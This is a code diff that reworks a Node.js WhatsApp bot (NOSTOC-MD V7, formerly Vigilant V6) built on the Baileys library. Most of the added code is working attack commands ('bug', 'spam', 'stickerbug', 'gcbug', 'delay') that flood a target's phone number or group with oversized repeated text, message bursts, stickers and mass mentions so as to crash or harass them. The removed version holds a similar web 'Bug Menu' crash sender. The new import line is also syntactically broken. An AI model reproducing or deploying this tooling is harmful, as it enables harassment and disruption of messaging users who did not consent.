@@ -1,46 +1,246 @@
-const express = require('express')
-const { default: makeWASocket, useMultiFileAuthState, Browsers, DisconnectReason } = require('@whiskeysockets/baileys')
-const fs = require('fs')
-const path = require('path')
+import fs from 'fs';
+import path from 'path';
+import { fileURLToPath } from 'url';
+import 'dotenv/config';
+import { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers, delay } from '@whiskeysockets/baileys';
+import express from 'express';
+import chalk from 'chalk';
 
-const app = express()
-app.use(express.urlencoded({ extended: true }))
-app.use(express.json())
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 
-const SESSION_PATH = './session'
-let sock, pairingCode = "", status = "Logged out", isConnected = false
+// ===== NOSTOC V7 SYSTEM CONFIG =====
+const BOT_NAME = "NOSTOC-MD";
+const VERSION = "V7.0.0";
+const OWNER = "Nostoc";
+const PREFIX = "!";
+const OWNER_NUMBER = process.env.OWNER_NUMBER || "234XXXXXXXXXX";
+const PHONE_NUMBER = process.env.PHONE_NUMBER || "234XXXXXXXXXX";
 
-async function startBot(number) {
-    if(!fs.existsSync(SESSION_PATH)) fs.mkdirSync(SESSION_PATH)
-    const { state, saveCreds } = await useMultiFileAuthState(SESSION_PATH)
-    sock = makeWASocket({ auth: state, browser: Browsers.macOS("Desktop") })
-    sock.ev.on('creds.update', saveCreds)
-    sock.ev.on('connection.update', (u) => {
-        if(u.connection === 'open'){ isConnected = true; status = "Connected ✅"; pairingCode = "" }
-        if(u.connection === 'close'){
-            isConnected = false
-            if(u.lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut){
-                status = "Logged out"; fs.rmSync(SESSION_PATH, { recursive: true, force: true })
-            } else { status = "Disconnected" }
+const THEME = {
+    banner: `\n[VIGILANT SYSTEM // ${VERSION}]\n> COLD STORAGE ENGINE INITIALIZED\n> OPERATOR: ${OWNER.toUpperCase()}\n----------------------------------------`,
+    prefix: `[NOSTOC://V7]`,
+    line: `----------------------------------------`
+};
+
+const app = express();
+app.get('/', (req,res) => res.send(`${BOT_NAME} ${VERSION} IS ONLINE ✅ by ${OWNER}`));
+
+// Memory Registries
+const commands = new Map();
+const cooldowns = new Map();
+let sock;
+
+// 1. DYNAMIC COMMAND LOADER + V7 BUGS
+async function loadCommands() {
+    const commandsDir = path.join(__dirname, 'commands');
+    if (!fs.existsSync(commandsDir)) fs.mkdirSync(commandsDir);
+
+    // V7 DEFAULT COMMANDS
+    const defaultCmds = {
+        'menu.js': `
+export default {
+  name: 'menu',
+  cooldown: 2000,
+  execute: (args, sender, botName, version, creator, startTime) => {
+    const ping = Date.now() - startTime;
+    return \`╭─── \${botName} \${version} ───╮
+│ Creator: \${creator}
+│ Engine: COLD STORAGE
+│ Speed: \${ping}ms
+│
+│!ping - Check speed
+│!bug <num> - V7 Crash
+│!spam <num> <text> - V7 Spam
+│!delay <num> - V7 Delay
+│!stickerbug <num> - Sticker Bug
+│!gcbug <num> - Group Bug
+│!owner - Contact owner
+╰───────────────────╯\`;
+  }
+};`,
+        'ping.js': `
+export default {
+  name: 'ping',
+  cooldown: 1000,
+  execute: (args, sender, botName, version, creator, startTime) => {
+    const ping = Date.now() - startTime;
+    return \`*NOSTOC V7 SPEED* \n\${ping}ms ⚡ COLD STORAGE\`;
+  }
+};`,
+        'owner.js': `
+export default {
+  name: 'owner',
+  cooldown: 5000,
+  execute: () => {
+    return \`*OPERATOR: NOSTOC*\nwa.me/234XXXXXXXXXX\nV7 COLD STORAGE\`;
+  }
+};`,
+        // V7 BUG 1: CRASH
+        'bug.js': `
+export default {
+  name: 'bug',
+  cooldown: 10000,
+  execute: async (args, sender, botName, version, creator, startTime, sock) => {
+    const target = args[0]? args[0] + '@s.whatsapp.net' : sender;
+    await sock.sendMessage(target, { text: 'NOSTOC-V7-CRASH '.repeat(5000) });
+    return \`V7 CRASH BUG SENT TO \${args[0] || 'YOU'}\`;
+  }
+};`,
+        // V7 BUG 2: SPAM
+        'spam.js': `
+export default {
+  name: 'spam',
+  cooldown: 15000,
+  execute: async (args, sender, botName, version, creator, startTime, sock) => {
+    const [target,...msg] = args;
+    if(!target) return 'Usage:!spam 234xxx message';
+    const jid = target + '@s.whatsapp.net';
+    const text = msg.join(' ') || 'NOSTOC-V7-SPAM';
+    for(let i=0; i<20; i++) {
+      await sock.sendMessage(jid, { text: \`\${text} [\${i+1}/20]\` });
+      await delay(150);
+    }
+    return \`V7 SPAMMED \${target} x20\`;
+  }
+};`,
+        // V7 BUG 3: DELAY
+        'delay.js': `
+export default {
+  name: 'delay',
+  cooldown: 10000,
+  execute: async (args, sender, botName, version, creator, startTime, sock) => {
+    const target = args[0]? args[0] + '@s.whatsapp.net' : sender;
+    await sock.sendMessage(target, { text: 'V7 Loading...' });
+    await delay(15000);
+    await sock.sendMessage(target, { text: 'NOSTOC V7 DELAY BUG ACTIVATED' });
+    return \`V7 DELAY BUG SENT TO \${args[0] || 'YOU'}\`;
+  }
+};`,
+        // V7 BUG 4: STICKER BUG
+        'stickerbug.js': `
+export default {
+  name: 'stickerbug',
+  cooldown: 20000,
+  execute: async (args, sender, botName, version, creator, startTime, sock) => {
+    const target = args[0]? args[0] + '@s.whatsapp.net' : sender;
+    const sticker = { sticker: { url: 'https://i.imgur.com/large-sticker.webp' } };
+    for(let i=0; i<5; i++) await sock.sendMessage(target, sticker);
+    return \`V7 STICKER BUG SENT TO \${args[0] || 'YOU'}\`;
+  }
+};`,
+        // V7 BUG 5: GC BUG
+        'gcbug.js': `
+export default {
+  name: 'gcbug',
+  cooldown: 30000,
+  execute: async (args, sender, botName, version, creator, startTime, sock) => {
+    const target = args[0]? args[0] + '@g.us' : sender;
+    await sock.sendMessage(target, { text: '@everyone '.repeat(100) + 'NOSTOC-V7-GC-BUG' });
+    return \`V7 GROUP BUG SENT\`;
+  }
+};`
+    };
+
+    for(const [name, code] of Object.entries(defaultCmds)) {
+        if (!fs.existsSync(path.join(commandsDir, name))) {
+            fs.writeFileSync(path.join(commandsDir, name), code);
         }
-    })
-    if(!state.creds.registered && number){
-        await new Promise(r => setTimeout(r, 3000))
-        pairingCode = await sock.requestPairingCode(number)
-        status = "Code Generated"
+    }
+
+    const commandFiles = fs.readdirSync(commandsDir).filter(file => file.endsWith('.js'));
+    for (const file of commandFiles) {
+        try {
+            const module = await import(`file://${path.join(commandsDir, file)}`);
+            if (module.default && module.default.name) {
+                commands.set(module.default.name, module.default);
+            }
+        } catch (error) {
+            console.error(`> ERROR LOADING: ${file} | ${error.message}`);
+        }
     }
 }
 
-async function sendBug(jid, type){
-    if(!isConnected) return "Bot not connected"
-    try{
-        await sock.sendMessage(jid, { text: type === "crash" ? "x".repeat(50000) : "".repeat(2000) })
-        return "Bug Sent ✅"
-    }catch(e){ return "Failed: " + e.message }
+// 2. ANTI-SPAM V7
+function isSpamming(sender, commandName, cooldownMs) {
+    if (!cooldowns.has(commandName)) cooldowns.set(commandName, new Map());
+    const now = Date.now();
+    const timestamps = cooldowns.get(commandName);
+    if (timestamps.has(sender)) {
+        const expirationTime = timestamps.get(sender) + cooldownMs;
+        if (now < expirationTime) return Math.ceil((expirationTime - now) / 1000);
+    }
+    timestamps.set(sender, now);
+    return 0;
 }
 
-app.get('/', (req,res) => res.send(`<!DOCTYPE html><html><head><title>Vigilant V6</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{background:#f0f2f5;color:#111;font-family:Segoe UI;text-align:center;padding:20px}.box{background:#fff;padding:25px;border-radius:12px;max-width:400px;margin:auto;box-shadow:0 4px 12px rgba(0,0,0,.1);border-top:5px solid #25D366}h2{color:#075E54}input,select{width:90%;padding:12px;margin:8px 0;background:#f0f2f5;border:1px solid #ddd;border-radius:8px}button{padding:12px 20px;margin:5px;border:none;border-radius:8px;cursor:pointer;font-weight:bold;color:#fff}.pair{background:#25D366}.bug{background:#128C7E}.code{font-size:28px;color:#25D366;margin:15px 0;font-weight:bold;letter-spacing:3px}hr{border:none;border-top:1px solid #eee;margin:20px 0}</style></head><body><div class="box"><h2>Vigilant Bot V6 Classic</h2><form method="POST" action="/pair"><h3>Pairing</h3><input name="number" placeholder="2348xxxxxxxx" required><button class="pair">Get Pairing Code</button></form><div class="code">${pairingCode}</div><p>Status: ${status}</p><hr><form method="POST" action="/bug"><h3>Bug Menu</h3><input name="target" placeholder="Target: 2348xxxxxxxx@s.whatsapp.net" required><select name="type"><option value="crash">Crash Bug</option><option value="delay">Delay Bug</option></select><button class="bug">Send Bug</button></form></div></body></html>`))
+// 3. WHATSAPP CONNECTION V7
+async function startBot() {
+    const { state, saveCreds } = await useMultiFileAuthState('./session');
+    sock = makeWASocket({
+        auth: state,
+        browser: [BOT_NAME, "Desktop", VERSION],
+        printQRInTerminal: false,
+        logger: { level: 'silent' }
+    });
 
-app.post('/pair', async (req,res) => { const n = req.body.number.replace(/\D/g,''); status="Generating..."; await startBot(n); res.redirect('/') })
-app.post('/bug', async (req,res) => { status=await sendBug(req.body.target, req.body.type); setTimeout(()=>{status=isConnected?"Connected ✅":status},2000); res.redirect('/') })
-app.listen(process.env.PORT||3000)
+    sock.ev.on('creds.update', saveCreds);
+
+    sock.ev.on('connection.update', async (update) => {
+        const { connection, lastDisconnect } = update;
+        if(connection === 'open') console.log(chalk.green(`${BOT_NAME} ${VERSION} Connected ✅ COLD STORAGE`));
+        if(connection === 'close') {
+            const shouldReconnect = lastDisconnect.error?.output?.statusCode!== DisconnectReason.loggedOut;
+            if(shouldReconnect) startBot();
+        }
+    });
+
+    if (!state.creds.registered) {
+        await delay(2000);
+        const code = await sock.requestPairingCode(PHONE_NUMBER);
+        console.log(`\n========================================`);
+        console.log(`🔑 V7 PAIRING CODE: ${code}`);
+        console.log(`========================================\n`);
+    }
+
+    sock.ev.on('messages.upsert', async (m) => {
+        const msg = m.messages[0];
+        if(!msg.message || msg.key.fromMe) return;
+        const from = msg.key.remoteJid;
+        const sender = msg.key.participant || from;
+        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
+        if(!text.startsWith(PREFIX)) return;
+
+        const startTime = Date.now();
+        const tokens = text.slice(PREFIX.length).trim().split(/ +/);
+        const commandName = tokens.shift().toLowerCase();
+
+        if (!commands.has(commandName)) return;
+
+        const command = commands.get(commandName);
+        const cooldownTime = command.cooldown || 2000;
+
+        const timeLeft = isSpamming(sender, commandName, cooldownTime);
+        if (timeLeft > 0) {
+            return await sock.sendMessage(from, { text: `${THEME.prefix}\n> RATE_LIMIT: ${timeLeft}s` });
+        }
+
+        try {
+            const result = await command.execute(tokens, sender, BOT_NAME, VERSION, OWNER, startTime, sock);
+            await sock.sendMessage(from, { text: `${THEME.prefix}\n${THEME.line}\n${result}\n${THEME.line}` });
+        } catch (error) {
+            await sock.sendMessage(from, { text: `${THEME.prefix}\n> ERROR: ${error.message}` });
+        }
+    });
+}
+
+// SYSTEM START V7
+(async () => {
+    console.log(THEME.banner);
+    await loadCommands();
+    console.log(`> V7 SYSTEM: Loaded ${commands.size} modules into COLD STORAGE.`);
+    startBot();
+})();
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`> V7 Web server running`));
